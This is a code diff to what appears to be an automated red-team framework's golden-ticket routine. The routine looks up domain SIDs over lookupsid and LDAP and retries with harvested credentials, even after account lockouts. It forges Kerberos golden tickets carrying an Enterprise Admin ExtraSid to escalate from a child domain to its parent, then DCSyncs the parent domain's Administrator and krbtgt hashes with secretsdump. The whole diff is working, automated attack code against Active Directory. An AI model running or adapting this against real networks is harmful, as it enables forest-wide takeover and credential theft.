@@ -3122,6 +3122,66 @@ def _is_transient_tool_error(stderr: str, return_code: int) -> bool:
     return bool(return_code != 0 and not stderr.strip())
 
 
+async def _get_domain_sid_via_ldap(
+    dc_ip: str, domain: str, cred: Any | None, auth_hash: Any | None
+) -> str | None:
+    """Get domain SID via LDAP query (fallback when lookupsid fails)."""
+    import base64
+    import re
+
+    from ares.tools.red.common import run_tool
+
+    domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
+    if cred and cred.password:
+        cmd = [
+            "ldapsearch",
+            "-LLL",
+            "-H",
+            f"ldap://{dc_ip}",
+            "-D",
+            f"{cred.username}@{cred.domain or domain}",
+            "-w",
+            cred.password,
+            "-b",
+            domain_dn,
+            "-s",
+            "base",
+            "objectSid",
+        ]
+    elif auth_hash:
+        logger.debug("LDAP SID lookup with hash not implemented")
+        return None
+    else:
+        return None
+    try:
+        stdout, _stderr, rc = run_tool(cmd, timeout_seconds=30, target_role="recon")
+        if rc != 0:
+            return None
+        b64_match = re.search(r"objectSid::\s*(\S+)", stdout)
+        if b64_match:
+            sid_bytes = base64.b64decode(b64_match.group(1))
+            return _binary_sid_to_string(sid_bytes)
+        str_match = re.search(r"objectSid:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", stdout)
+        return str_match.group(1) if str_match else None
+    except Exception as e:
+        logger.debug(f"LDAP SID query error: {e}")
+        return None
+
+
+def _binary_sid_to_string(sid_bytes: bytes) -> str:
+    """Convert binary SID to string (S-1-5-21-...)."""
+    if len(sid_bytes) < 8:
+        raise ValueError("SID too short")
+    revision = sid_bytes[0]
+    num_sub_auths = sid_bytes[1]
+    id_auth = int.from_bytes(sid_bytes[2:8], byteorder="big")
+    sub_auths = []
+    for i in range(num_sub_auths):
+        offset = 8 + i * 4
+        sub_auths.append(int.from_bytes(sid_bytes[offset : offset + 4], byteorder="little"))
+    return f"S-{revision}-{id_auth}" + "".join(f"-{sa}" for sa in sub_auths)
+
+
 def _run_lookupsid_with_retry(
     cmd: list[str],
     timeout_seconds: int = 60,
@@ -3196,6 +3256,40 @@ async def _auto_golden_ticket(
             first_check = False
 
             state = dispatcher.shared_state
+
+            # Sync hashes, credentials, and DA domains from Redis to pick up injected data
+            # This allows inject-hash/inject-credential CLI commands to work for testing
+            if dispatcher._task_queue and dispatcher._task_queue.redis:
+                try:
+                    from ares.core.state_backend import RedisStateBackend
+
+                    backend = RedisStateBackend(dispatcher._task_queue.redis, state.operation_id)
+                    # Merge Redis hashes into in-memory state
+                    redis_hashes = await backend.get_hashes()
+                    for h in redis_hashes:
+                        if not any(
+                            existing.username.lower() == h.username.lower()
+                            and existing.domain.lower() == (h.domain or "").lower()
+                            and existing.hash_value == h.hash_value
+                            for existing in state.all_hashes
+                        ):
+                            state.all_hashes.append(h)
+                    # Merge Redis credentials into in-memory state
+                    redis_creds = await backend.get_credentials()
+                    for c in redis_creds:
+                        if not any(
+                            existing.username.lower() == c.username.lower()
+                            and existing.domain.lower() == (c.domain or "").lower()
+                            for existing in state.all_credentials
+                        ):
+                            state.all_credentials.append(c)
+                    # Merge Redis domain_admin_domains into in-memory state
+                    redis_da_domains = await backend.get_domain_admin_domains()
+                    for d in redis_da_domains:
+                        if d.lower() not in [x.lower() for x in state.domain_admin_domains]:
+                            state.domain_admin_domains.append(d.lower())
+                except Exception as sync_err:
+                    logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
             # Get domains that already have golden tickets (from persisted state)
             processed_domains = {
@@ -3372,30 +3466,28 @@ async def _auto_golden_ticket(
                     # Parse domain SID from output
                     sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
 
-                    # If PTH failed with LOGON_FAILURE, try password credentials as fallback
-                    # This handles cases where hash is from wrong domain due to state sync issues
-                    if (
-                        not sid_match
-                        and "STATUS_LOGON_FAILURE" in output
-                        and auth_hash
-                        and not cred
-                    ):
+                    # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
+                    # This handles cases where hash is from wrong domain or account is locked
+                    auth_failed = (
+                        "STATUS_LOGON_FAILURE" in output or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                    )
+                    tried_users = {cred.username.lower()} if cred else set()
+                    if not sid_match and auth_failed:
                         logger.warning(
-                            f"🎫 Auto-golden-ticket: PTH failed for {domain}, trying password fallback"
+                            f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
                         )
-                        # Find any password credential (cross-domain auth via trust)
+                        # Try other password credentials (skip the one that just failed)
                         for c in state.all_credentials:
-                            if c.password:
-                                cred = c
-                                break
-                        if cred:
+                            if not c.password or c.username.lower() in tried_users:
+                                continue
+                            tried_users.add(c.username.lower())
                             cmd = [
                                 "impacket-lookupsid",
-                                f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                                f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
                             ]
                             logger.info(
-                                f"🎫 Auto-golden-ticket: Retrying lookupsid with password for "
-                                f"{cred.domain}\\{cred.username}"
+                                f"🎫 Auto-golden-ticket: Retrying lookupsid with "
+                                f"{c.domain}\\{c.username}"
                             )
                             try:
                                 stdout, stderr, _ = _run_lookupsid_with_retry(
@@ -3408,33 +3500,197 @@ async def _auto_golden_ticket(
                                 sid_match = re.search(
                                     r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
                                 )
+                                if sid_match:
+                                    break  # Success! Exit retry loop
+                                # If this cred also failed with auth error, continue to next
+                                if (
+                                    "STATUS_LOGON_FAILURE" in output
+                                    or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                                ):
+                                    logger.warning(
+                                        f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
+                                    )
+                                    continue
                             except (TransientToolError, RetryError):
-                                pass  # Fall through to failure handling
+                                continue  # Try next credential
 
-                    if not sid_match:
-                        # Lookupsid ran but couldn't extract SID - this is a permanent failure
-                        # (bad creds, wrong domain, etc.)
+                    # First check if we have a cached SID from secretsdump
+                    domain_sid = state.domain_sids.get(domain.lower())
+                    if domain_sid:
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Using cached domain SID for {domain}: {domain_sid}"
+                        )
+                    elif sid_match:
+                        domain_sid = sid_match.group(1)
+                        state.domain_sids[domain.lower()] = domain_sid
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}"
+                        )
+                    else:
+                        # Lookupsid failed - try LDAP fallback
                         logger.warning(
-                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}, "
-                            f"output: {output_preview}"
+                            f"🎫 Auto-golden-ticket: lookupsid failed for {domain}, "
+                            f"trying LDAP fallback. Output: {output_preview}"
                         )
-                        state.add_golden_ticket(
-                            {
-                                "domain": domain,
-                                "ticket_path": None,
-                                "created_at": datetime.now(timezone.utc).isoformat(),
-                                "status": "failed_no_sid",
-                                "error": output[:500]
-                                if output.strip()
-                                else "No output from lookupsid",
-                            }
-                        )
-                        # Update processed_domains to prevent duplicate attempts in this iteration
-                        processed_domains.add(domain.lower())
-                        continue
+                        try:
+                            domain_sid = await _get_domain_sid_via_ldap(
+                                dc_ip, domain, cred, auth_hash
+                            )
+                            if domain_sid:
+                                state.domain_sids[domain.lower()] = domain_sid
+                                logger.info(
+                                    f"🎫 Auto-golden-ticket: Got domain SID via LDAP: {domain_sid}"
+                                )
+                        except Exception as ldap_err:
+                            logger.warning(f"🎫 Auto-golden-ticket: LDAP failed: {ldap_err}")
 
-                    domain_sid = sid_match.group(1)
-                    logger.info(f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}")
+                        if not domain_sid:
+                            # Both lookupsid and LDAP failed
+                            logger.warning(
+                                f"🎫 Auto-golden-ticket: Could not get SID for {domain} "
+                                f"via lookupsid or LDAP"
+                            )
+                            state.add_golden_ticket(
+                                {
+                                    "domain": domain,
+                                    "ticket_path": None,
+                                    "created_at": datetime.now(timezone.utc).isoformat(),
+                                    "status": "failed_no_sid",
+                                    "error": output[:500]
+                                    if output.strip()
+                                    else "No output from lookupsid",
+                                }
+                            )
+                            processed_domains.add(domain.lower())
+                            continue
+
+                    # Check if this is a child domain - if so, get parent SID for ExtraSid
+                    # Parent-child trusts have NO SID filtering, so we can inject Enterprise Admin SID
+                    parent_domain = None
+                    parent_sid = None
+                    domain_parts = domain.lower().split(".")
+                    if len(domain_parts) >= 3:  # child.parent.tld has 3+ parts
+                        potential_parent = ".".join(domain_parts[1:])  # e.g., contoso.local
+                        # Parent ALWAYS exists for child domains - it's implicit in the hierarchy
+                        # Don't require it to be pre-discovered in state
+                        parent_domain = potential_parent
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Child domain detected: {domain}\n"
+                            f"   Parent domain: {parent_domain} (attempting ExtraSid attack)"
+                        )
+
+                    if parent_domain:
+                        # Get parent domain's DC IP
+                        parent_dc_ip = state.domain_controllers.get(parent_domain)
+                        if not parent_dc_ip:
+                            # Try to find parent DC from hosts
+                            for host in state.all_hosts:
+                                if (
+                                    host.is_dc
+                                    and host.hostname
+                                    and host.hostname.lower().endswith(f".{parent_domain}")
+                                    and not host.hostname.lower().endswith(f".{domain.lower()}")
+                                ):
+                                    parent_dc_ip = host.ip
+                                    break
+
+                        # DNS fallback - resolve parent DC via SRV lookup
+                        if not parent_dc_ip:
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: Parent DC not in state, "
+                                f"trying DNS resolution for {parent_domain}"
+                            )
+                            try:
+                                import subprocess
+
+                                # Use dig to query SRV record for LDAP service
+                                dns_cmd = [
+                                    "dig",
+                                    "+short",
+                                    f"_ldap._tcp.dc._msdcs.{parent_domain}",
+                                    "SRV",
+                                ]
+                                result = subprocess.run(  # noqa: ASYNC221
+                                    dns_cmd,
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=10,
+                                    check=False,
+                                )
+                                if result.returncode == 0 and result.stdout.strip():
+                                    # SRV format: priority weight port target
+                                    # e.g., "0 100 389 dc.contoso.local."
+                                    for line in result.stdout.strip().split("\n"):
+                                        parts = line.split()
+                                        if len(parts) >= 4:
+                                            dc_hostname = parts[3].rstrip(".")
+                                            # Resolve hostname to IP
+                                            a_cmd = ["dig", "+short", dc_hostname, "A"]
+                                            a_result = subprocess.run(  # noqa: ASYNC221
+                                                a_cmd,
+                                                capture_output=True,
+                                                text=True,
+                                                timeout=10,
+                                                check=False,
+                                            )
+                                            if a_result.returncode == 0 and a_result.stdout.strip():
+                                                parent_dc_ip = a_result.stdout.strip().split("\n")[
+                                                    0
+                                                ]
+                                                logger.info(
+                                                    f"🎫 Auto-golden-ticket: Resolved parent DC via DNS: "
+                                                    f"{dc_hostname} -> {parent_dc_ip}"
+                                                )
+                                                # Cache for future use (don't persist - transient)
+                                                state.domain_controllers[parent_domain] = (
+                                                    parent_dc_ip
+                                                )
+                                                break
+                            except Exception as dns_err:
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: DNS resolution failed for parent: {dns_err}"
+                                )
+
+                        if parent_dc_ip:
+                            # Run lookupsid on parent DC to get parent SID
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: Child domain detected! "
+                                f"Getting parent SID from {parent_domain} ({parent_dc_ip})"
+                            )
+                            if cred:
+                                parent_cmd = [
+                                    "impacket-lookupsid",
+                                    f"{cred.domain}/{cred.username}:{cred.password}@{parent_dc_ip}",
+                                ]
+                            else:
+                                assert auth_hash is not None  # noqa: S101
+                                nt_hash = auth_hash.hash_value
+                                if ":" in nt_hash:
+                                    nt_hash = nt_hash.split(":")[-1]
+                                parent_cmd = [
+                                    "impacket-lookupsid",
+                                    f"{auth_hash.domain}/{auth_hash.username}@{parent_dc_ip}",
+                                    "-hashes",
+                                    f":{nt_hash}",
+                                ]
+                            try:
+                                parent_stdout, parent_stderr, _ = _run_lookupsid_with_retry(
+                                    parent_cmd, timeout_seconds=60
+                                )
+                                parent_output = parent_stdout + "\n" + (parent_stderr or "")
+                                parent_sid_match = re.search(
+                                    r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", parent_output
+                                )
+                                if parent_sid_match:
+                                    parent_sid = parent_sid_match.group(1)
+                                    logger.info(
+                                        f"🎫 Auto-golden-ticket: Got parent SID {parent_sid} "
+                                        f"for {parent_domain}"
+                                    )
+                            except Exception as e:
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: Failed to get parent SID: {e}"
+                                )
 
                     # Generate golden ticket
                     # Extract just the NT hash if in LM:NT format
@@ -3442,7 +3698,7 @@ async def _auto_golden_ticket(
                     if ":" in krbtgt_nt_hash:
                         krbtgt_nt_hash = krbtgt_nt_hash.split(":")[-1]
 
-                    ticket_path = "Administrator.ccache"
+                    ticket_path = "/tmp/Administrator.ccache"  # nosec B108 # noqa: S108
                     cmd = [
                         "impacket-ticketer",
                         "-nthash",
@@ -3455,6 +3711,19 @@ async def _auto_golden_ticket(
                         "500",
                         "Administrator",
                     ]
+
+                    # Add ExtraSid for parent domain Enterprise Admin if we have parent SID
+                    # This enables child-to-parent escalation via SID history injection
+                    if parent_sid:
+                        enterprise_admin_sid = f"{parent_sid}-519"
+                        cmd.insert(-1, "-extra-sid")  # Insert before "Administrator"
+                        cmd.insert(-1, enterprise_admin_sid)
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Adding ExtraSid for Enterprise Admin!\n"
+                            f"   Child: {domain} (SID: {domain_sid})\n"
+                            f"   Parent: {parent_domain} (SID: {parent_sid})\n"
+                            f"   ExtraSid: {enterprise_admin_sid}"
+                        )
                     stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
                     output = stdout + "\n" + (stderr or "")
 
@@ -3468,12 +3737,33 @@ async def _auto_golden_ticket(
                         # Fallback to IP if no FQDN found
                         dc_target = dc_fqdn or dc_ip
 
-                        logger.success(
-                            f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
-                            f"→ Ticket saved as {ticket_path}\n"
-                            f"→ Use: export KRB5CCNAME={ticket_path}\n"
-                            f"→ Then: psexec.py -k -no-pass -target-ip {dc_ip} {dc_target}"
-                        )
+                        # Build success message based on whether we have ExtraSid
+                        if parent_sid:
+                            # Get parent DC for the "next steps" message
+                            parent_dc_fqdn = None
+                            for host in state.all_hosts:
+                                if host.is_dc and host.hostname:
+                                    h_domain = ".".join(host.hostname.lower().split(".")[1:])
+                                    if h_domain == parent_domain:
+                                        parent_dc_fqdn = host.hostname
+                                        break
+                            parent_dc_target = parent_dc_fqdn or parent_dc_ip or "parent-dc"
+
+                            logger.success(
+                                f"🎫 GOLDEN TICKET WITH EXTRASID GENERATED!\n"
+                                f"→ Child domain: {domain}\n"
+                                f"→ Parent domain: {parent_domain} (ENTERPRISE ADMIN ACCESS)\n"
+                                f"→ Ticket saved as {ticket_path}\n"
+                                f"→ Use: export KRB5CCNAME={ticket_path}\n"
+                                f"→ DCSync parent: secretsdump.py -k -no-pass {parent_dc_target}"
+                            )
+                        else:
+                            logger.success(
+                                f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
+                                f"→ Ticket saved as {ticket_path}\n"
+                                f"→ Use: export KRB5CCNAME={ticket_path}\n"
+                                f"→ Then: psexec.py -k -no-pass -target-ip {dc_ip} {dc_target}"
+                            )
 
                         # Announce golden ticket - this sets has_golden_ticket, checkpoints,
                         # and marks operation complete if stop_on_golden_ticket is enabled
@@ -3482,19 +3772,149 @@ async def _auto_golden_ticket(
                             krbtgt_hash=hash_obj.hash_value,
                             ticket_path=ticket_path,
                             source_agent="auto_golden_ticket",
+                            target_domain=parent_domain if parent_sid else None,
                         )
 
+                        # If we have Enterprise Admin via ExtraSid, also mark parent domain as dominated
+                        if parent_sid and parent_domain:
+                            if parent_domain.lower() not in [
+                                d.lower() for d in state.domain_admin_domains
+                            ]:
+                                state.domain_admin_domains.append(parent_domain)
+                                logger.info(
+                                    f"🎫 Enterprise Admin achieved on parent domain: {parent_domain}"
+                                )
+
+                            # DCSync parent domain to get Administrator hash for trust extraction
+                            # This is needed because child domain hash doesn't work on parent DC
+                            if parent_dc_ip:
+                                logger.info(
+                                    f"🎫 Auto-golden-ticket: DCSync parent domain {parent_domain} "
+                                    f"using golden ticket with ExtraSid"
+                                )
+                                try:
+                                    # DCSync parent domain - just get Administrator
+                                    parent_dc_fqdn = None
+                                    for h in state.all_hosts:
+                                        if h.ip == parent_dc_ip and h.hostname:
+                                            parent_dc_fqdn = h.hostname
+                                            break
+                                    parent_target = parent_dc_fqdn or parent_dc_ip
+
+                                    # Update /etc/hosts for Kerberos to resolve domain KDCs
+                                    # The golden ticket realm is the CHILD domain, so Kerberos
+                                    # needs to contact child domain KDC for authentication
+                                    try:
+                                        hosts_entries = []
+                                        # Add child domain DC (ticket realm KDC)
+                                        child_dc_ip = state.domain_controllers.get(domain.lower())
+                                        if child_dc_ip:
+                                            hosts_entries.append(
+                                                f"{child_dc_ip}  {domain} {domain.upper()}"
+                                            )
+                                        # Add parent domain DC
+                                        hosts_entries.append(
+                                            f"{parent_dc_ip}  {parent_domain} {parent_domain.upper()}"
+                                        )
+                                        if hosts_entries:
+                                            with open("/etc/hosts", "a") as f:  # noqa: ASYNC230
+                                                f.write("\n# Ares golden ticket domains\n")
+                                                f.writelines(
+                                                    f"{entry}\n" for entry in hosts_entries
+                                                )
+                                            logger.debug(
+                                                f"🎫 Added /etc/hosts entries for Kerberos: "
+                                                f"{hosts_entries}"
+                                            )
+                                    except Exception as hosts_err:
+                                        logger.warning(
+                                            f"🎫 Failed to update /etc/hosts: {hosts_err}"
+                                        )
+
+                                    # Run secretsdump with KRB5CCNAME set in the remote shell
+                                    # (os.environ only affects local process, not remote execution)
+                                    dcsync_cmd = [
+                                        "bash",
+                                        "-c",
+                                        f"KRB5CCNAME={ticket_path} impacket-secretsdump -k -no-pass "
+                                        f"-just-dc-user Administrator -target-ip {parent_dc_ip} {parent_target}",
+                                    ]
+                                    logger.info(
+                                        f"🎫 Running DCSync on parent: KRB5CCNAME={ticket_path} "
+                                        f"impacket-secretsdump -k -no-pass -just-dc-user Administrator "
+                                        f"-target-ip {parent_dc_ip} {parent_target}"
+                                    )
+                                    dcsync_stdout, dcsync_stderr, _dcsync_rc = run_tool(
+                                        dcsync_cmd, timeout_seconds=120
+                                    )
+                                    dcsync_output = dcsync_stdout + "\n" + (dcsync_stderr or "")
+
+                                    # Parse Administrator hash from output
+                                    # Format: domain\Administrator:RID:LM:NT:::
+                                    admin_hash_match = re.search(
+                                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                                        dcsync_output,
+                                    )
+                                    if admin_hash_match:
+                                        parent_admin_hash = admin_hash_match.group(1)
+                                        logger.success(
+                                            f"🎫 Got parent Administrator hash via DCSync: "
+                                            f"{parent_domain}\\Administrator"
+                                        )
+                                        # Add parent Administrator hash to state
+                                        from ares.core.models import Hash
+
+                                        parent_hash_obj = Hash(
+                                            username="Administrator",
+                                            domain=parent_domain,
+                                            hash_type="NTLM",
+                                            hash_value=parent_admin_hash,
+                                            source="auto_golden_ticket:dcsync_parent",
+                                        )
+                                        state.add_hash(parent_hash_obj)
+
+                                        # Also get parent krbtgt if present
+                                        krbtgt_match = re.search(
+                                            r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                                            dcsync_output,
+                                        )
+                                        if krbtgt_match:
+                                            parent_krbtgt_hash = krbtgt_match.group(1)
+                                            parent_krbtgt_obj = Hash(
+                                                username="krbtgt",
+                                                domain=parent_domain,
+                                                hash_type="NTLM",
+                                                hash_value=parent_krbtgt_hash,
+                                                source="auto_golden_ticket:dcsync_parent",
+                                            )
+                                            state.add_hash(parent_krbtgt_obj)
+                                            logger.success(
+                                                f"🎫 Got parent krbtgt hash via DCSync: "
+                                                f"{parent_domain}\\krbtgt"
+                                            )
+                                    else:
+                                        logger.warning(
+                                            f"🎫 DCSync parent failed to extract Administrator hash: "
+                                            f"{dcsync_output[:300]}"
+                                        )
+                                except Exception as dcsync_err:
+                                    logger.warning(f"🎫 DCSync parent domain failed: {dcsync_err}")
+
                         # Store ticket details in state (persisted to Redis!)
-                        state.add_golden_ticket(
-                            {
-                                "domain": domain,
-                                "ticket_path": ticket_path,
-                                "domain_sid": domain_sid,
-                                "krbtgt_hash": hash_obj.hash_value,
-                                "created_at": datetime.now(timezone.utc).isoformat(),
-                                "status": "success",
-                            }
-                        )
+                        ticket_info = {
+                            "domain": domain,
+                            "ticket_path": ticket_path,
+                            "domain_sid": domain_sid,
+                            "krbtgt_hash": hash_obj.hash_value,
+                            "created_at": datetime.now(timezone.utc).isoformat(),
+                            "status": "success",
+                        }
+                        if parent_sid:
+                            ticket_info["parent_domain"] = parent_domain
+                            ticket_info["parent_sid"] = parent_sid
+                            ticket_info["extra_sid"] = f"{parent_sid}-519"
+                            ticket_info["enterprise_admin"] = True
+                        state.add_golden_ticket(ticket_info)
                         # Update processed_domains to prevent duplicate attempts in this iteration
                         processed_domains.add(domain.lower())
 
@@ -3512,8 +3932,10 @@ async def _auto_golden_ticket(
                         state.operation_timeline.append(timeline_event)
 
                         # Persist timeline event to Redis
-                        backend = getattr(state, "_backend", None)
-                        if backend:
+                        timeline_backend: RedisStateBackend | None = getattr(
+                            state, "_backend", None
+                        )
+                        if timeline_backend is not None:
                             event_dict = {
                                 "id": timeline_event.id,
                                 "timestamp": timeline_event.timestamp.isoformat(),
@@ -3523,7 +3945,7 @@ async def _auto_golden_ticket(
                                 "confidence": timeline_event.confidence,
                                 "source": timeline_event.source,
                             }
-                            await backend.add_timeline_event(event_dict)
+                            await timeline_backend.add_timeline_event(event_dict)
                     else:
                         logger.warning(
                             f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
